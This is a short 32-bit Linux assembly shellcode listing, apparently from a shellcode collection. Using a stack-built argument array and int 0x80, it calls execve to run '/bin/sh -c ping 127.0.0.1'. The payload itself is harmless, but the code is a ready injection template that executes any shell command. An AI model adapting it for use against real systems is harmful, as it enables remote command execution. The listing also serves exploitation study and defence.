;Linux/x86 -  sys_execve(/bin/sh, -c, ping localhost)
; Yiu King Yau
; 2019-02-18
section .text
        global _start

_start:
        xor eax, eax                 ;zero out eax
        push byte +0xb
        pop eax
        cdq
        push edx
        push dword 0x2020312e        ; push '.1  '
        push dword 0x302e302e        ; push '.0.0'
        push dword 0x37323120        ; push ' 127'
        push dword 0x676e6970        ; push 'ping'
        mov esi,esp
        push edx
        push word 0x632d             ; push '-c'
        mov ecx,esp
        push edx
        push dword 0x68732f2f        ; push '//sh'
        push dword 0x2f2f6e69        ; push 'in//'
        push dword 0x622f2f2f        ; push '///b'
        mov ebx,esp
        push edx
        push esi
        push ecx
        push ebx
        mov ecx,esp
        int 0x80
